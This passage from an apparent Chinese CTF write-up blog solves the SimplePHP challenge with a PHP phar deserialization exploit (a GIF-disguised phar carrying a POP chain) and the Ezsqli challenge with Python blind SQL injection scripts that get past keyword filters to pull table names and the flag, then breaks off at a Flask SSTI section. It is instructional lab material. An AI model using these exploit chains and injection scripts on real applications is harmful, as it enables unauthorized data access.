</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">files</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">results</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">funcs</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
</span></span><span style="display:flex;"><span>        $file <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">File</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">array_push</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">files</span>, $file);
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">results</span>[$file<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span>()] <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">File</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/flag.txt&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">name</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">basename</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$obj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>();
</span></span><span style="display:flex;"><span>$obj<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">db</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FileList</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">unlink</span>(<span style="color:#e6db74">&#34;phar.phar&#34;</span>);
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Phar</span>(<span style="color:#e6db74">&#39;phar.phar&#39;</span>);
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">stopBuffering</span>();
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">setStub</span>(<span style="color:#e6db74">&#39;GIF89a&#39;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;</span>);
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">addFromString</span>(<span style="color:#e6db74">&#39;test.txt&#39;</span>,<span style="color:#e6db74">&#39;test&#39;</span>);
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">setMetadata</span>($obj);
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">stopBuffering</span>();
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>改后缀为.gif上传，delete.php会调用class.php中delete函数的unlink，download.php会调用class.php中open函数的file_exists，但是download.php中存在open_basedir，限制了获取范围，只有delete才能获取<code>/flag.txt</code>：</p>
<p><img alt="本地图片" loading="lazy" src="./img/4.png"></p>
<hr>
<h2 id="swpuctf-2018simplephp">[SWPUCTF 2018]SimplePHP<a hidden class="anchor" aria-hidden="true" href="#swpuctf-2018simplephp">#</a></h2>
<p>function.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">//show_source(__FILE__); 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;base.php&#34;</span>; 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Content-type: text/html;charset=utf-8&#34;</span>); 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>); 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">upload_file_do</span>() { 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> $_FILES; 
</span></span><span style="display:flex;"><span>    $filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>]<span style="color:#f92672">.</span>$_SERVER[<span style="color:#e6db74">&#34;REMOTE_ADDR&#34;</span>])<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;.jpg&#34;</span>; 
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//mkdir(&#34;upload&#34;,0777); 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">file_exists</span>(<span style="color:#e6db74">&#34;upload/&#34;</span> <span style="color:#f92672">.</span> $filename)) { 
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">unlink</span>($filename); 
</span></span><span style="display:flex;"><span>    } 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">move_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;tmp_name&#34;</span>],<span style="color:#e6db74">&#34;upload/&#34;</span> <span style="color:#f92672">.</span> $filename); 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;script type=&#34;text/javascript&#34;&gt;alert(&#34;上传成功!&#34;);&lt;/script&gt;&#39;</span>; 
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">upload_file</span>() { 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> $_FILES; 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">upload_file_check</span>()) { 
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">upload_file_do</span>(); 
</span></span><span style="display:flex;"><span>    } 
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">upload_file_check</span>() { 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> $_FILES; 
</span></span><span style="display:flex;"><span>    $allowed_types <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;gif&#34;</span>,<span style="color:#e6db74">&#34;jpeg&#34;</span>,<span style="color:#e6db74">&#34;jpg&#34;</span>,<span style="color:#e6db74">&#34;png&#34;</span>); 
</span></span><span style="display:flex;"><span>    $temp <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;.&#34;</span>,$_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>]); 
</span></span><span style="display:flex;"><span>    $extension <span style="color:#f92672">=</span> <span style="color:#a6e22e">end</span>($temp); 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($extension)) { 
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//echo &#34;&lt;h4&gt;请选择上传的文件:&#34; . &#34;&lt;h4/&gt;&#34;; 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    } 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>{ 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">in_array</span>($extension,$allowed_types)) { 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>; 
</span></span><span style="display:flex;"><span>        } 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> { 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;script type=&#34;text/javascript&#34;&gt;alert(&#34;Invalid file!&#34;);&lt;/script&gt;&#39;</span>; 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>; 
</span></span><span style="display:flex;"><span>        } 
</span></span><span style="display:flex;"><span>    } 
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"> 
</span></span></span></code></pre></div><p>upload_file.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;function.php&#39;</span>; 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">upload_file</span>(); 
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">  
</span></span></span></code></pre></div><p>base.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">echo</span> $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>];<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>index.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;content-type:text/html;charset=utf-8&#34;</span>);  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;base.php&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"> 
</span></span></span></code></pre></div><p>file.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;content-type:text/html;charset=utf-8&#34;</span>);  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;function.php&#39;</span>; 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;class.php&#39;</span>; 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;open_basedir&#39;</span>,<span style="color:#e6db74">&#39;/var/www/html/&#39;</span>); 
</span></span><span style="display:flex;"><span>$file <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;file&#34;</span>] <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#39;file&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>; 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($file)) { 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&#34;</span>; 
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span>$show <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Show</span>(); 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">file_exists</span>($file)) { 
</span></span><span style="display:flex;"><span>    $show<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> $file; 
</span></span><span style="display:flex;"><span>    $show<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_show</span>(); 
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($file)){ 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;file doesn\&#39;t exists.&#39;</span>); 
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>class.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">C1e4r</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $test;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $str;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>($name)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span> <span style="color:#f92672">=</span> $name;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__destruct</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test</span> <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Show</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $source;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $str;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>($file)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> $file;   <span style="color:#75715e">//$this-&gt;source = phar://phar.jpg
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__toString</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $content <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span>[<span style="color:#e6db74">&#39;str&#39;</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $content;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__set</span>($key,$value)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span>$key <span style="color:#f92672">=</span> $value;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_show</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;</span>,$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;hacker!&#39;</span>);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">highlight_file</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__wakeup</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/http|https|file:|gopher|dict|\.\./i&#34;</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;hacker~&#34;</span>;
</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;index.php&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $file;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $params;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">params</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__get</span>($key)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>($key);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get</span>($key)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">params</span>[$key])) {
</span></span><span style="display:flex;"><span>            $value <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">params</span>[$key];
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            $value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;index.php&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_get</span>($value);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">file_get</span>($value)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $text <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">file_get_contents</span>($value));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $text;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"> 
</span></span></span></code></pre></div><p>文件上传定死了后缀，没有unserialize入口，存在file_exists，尝试phar反序列化，构造的时候注意get魔术方法的参数$key就是无法访问的变量名，即&quot;source&quot;：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Show</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $source;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $str;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $file;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $params;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">C1e4r</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $test;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $str;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$o <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Test</span>();
</span></span><span style="display:flex;"><span>$o<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">params</span>[<span style="color:#e6db74">&#39;source&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/var/www/html/f1ag.php&#34;</span>;
</span></span><span style="display:flex;"><span>$ob <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Show</span>();
</span></span><span style="display:flex;"><span>$ob<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span>[<span style="color:#e6db74">&#39;str&#39;</span>] <span style="color:#f92672">=</span> $o;
</span></span><span style="display:flex;"><span>$obj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">C1e4r</span>();
</span></span><span style="display:flex;"><span>$obj<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span> <span style="color:#f92672">=</span> $ob;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">unlink</span>(<span style="color:#e6db74">&#34;phar.phar&#34;</span>);
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Phar</span>(<span style="color:#e6db74">&#39;phar.phar&#39;</span>);
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">stopBuffering</span>();
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">setStub</span>(<span style="color:#e6db74">&#39;GIF89a&#39;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;</span>);
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">addFromString</span>(<span style="color:#e6db74">&#39;test.txt&#39;</span>,<span style="color:#e6db74">&#39;test&#39;</span>);
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">setMetadata</span>($obj);
</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">stopBuffering</span>();
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>改个后缀上传，在file.php实现file_exists触发phar反序列化：</p>
<pre tabindex="0"><code>?file=phar:///var/www/html/upload/0208c520bdd56cda1421798ee798e6d6.jpg

GIF89a&lt;?php __HALT_COMPILER(); ?&gt; 
PD9waHAgDQoJLy8kYSA9ICdmbGFnezg0Yjg2NzIwLWNkNDAtNGZmOS1hOTNhLTgzNzgzMjAxNjA2ZX0nOw0KID8+DQoNCg==
</code></pre><p>base64解码得到f1ag.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//$a = &#39;flag{84b86720-cd40-4ff9-a93a-83783201606e}&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>参考文章：</p>
<p><a href="https://xz.aliyun.com/news/6303">https://xz.aliyun.com/news/6303</a></p>
<p><a href="https://www.php.net/manual/en/language.oop5.overloading.php#object.get">https://www.php.net/manual/en/language.oop5.overloading.php#object.get</a></p>
<hr>
<h2 id="gyctf2020ezsqli">[GYCTF2020]Ezsqli<a hidden class="anchor" aria-hidden="true" href="#gyctf2020ezsqli">#</a></h2>
<p>过滤了 <code>if case in limit for union</code>，导致常规的information_schema无法使用，先测试一下基本的布尔注入格式：</p>
<pre tabindex="0"><code>0||(length(database())=22)
</code></pre><p>用sys.schema_table_statistics_with_buffer来绕过information_schema，但是只能获取表名无法获取列名</p>
<pre tabindex="0"><code>import requests
import string

url = &#34;http://8aee5d6a-4903-4e9d-869b-18fe17c5fa0b.node5.buuoj.cn:81/index.php&#34;
chars = &#34;,_-&#34; + string.ascii_lowercase + string.ascii_uppercase + string.digits
tables = &#34;&#34;
for i in range(1,40):   
    for c in chars:   
        # 0||(ascii(substr( (select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database() ),1,1))=117)
        payload = f&#34;0||(ascii(substr( (select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database() ),{i},1))={ord(c)})&#34;
        data = {&#34;id&#34;: payload}

        resp = requests.post(url,data)
        if &#34;Nu1L&#34; in resp.text:
            print(c)
            tables += c
            break
print(tables)

# users233333333333333,f1ag_1s_h3r3_hhhhh
</code></pre><p>由于过滤了union，只能用比较ascii值的无列名注入，需要测试一下列数，还好本题表中只有一行，并且第一列就是1，否则还需要用到<code>limit 0,1</code>并爆出完整的第一列的值：</p>
<pre tabindex="0"><code>import requests
import time

url = &#34;http://71275840-d765-4954-aefa-bc558505f6a0.node5.buuoj.cn:81&#34;
chars = r&#34;-0123456789abcdefgl{}&#34;  # 按照ascii值大小排列，用于无列名注入

flag = &#34;&#34;
for i in range(0,42):   
    for c in chars:   
        payload = f&#34;((select 1,&#39;{flag+c}&#39;) &gt; (select * from f1ag_1s_h3r3_hhhhh))&#34;
        data = {&#34;id&#34;: payload}
        
        resp = requests.post(url,data)
        if &#34;Nu1L&#34; in resp.text:
            cc = chars[chars.index(c)-1]
            print(cc)
            flag += cc
            break
print(flag)

# flag{67082dc1-010b-4e09-8734-cee942fbe7ab}
</code></pre><p>参考文章：</p>
<p><a href="https://exp10it.io/2022/08/mysql-no-column-name-isql-injection/">https://exp10it.io/2022/08/mysql-no-column-name-isql-injection/</a></p>
<p><a href="https://geekdaxue.co/read/yuandian-efswk@es3ll7/big7qv">https://geekdaxue.co/read/yuandian-efswk@es3ll7/big7qv</a></p>
<hr>
<h2 id="rootersctf2019i_3_flask">[RootersCTF2019]I_&lt;3_Flask<a hidden class="anchor" aria-hidden="true" href="#rootersctf2019i_3_flask">#</a></h2>
<p>注入点为name，有参数长度限制，没有禁用config：</p>
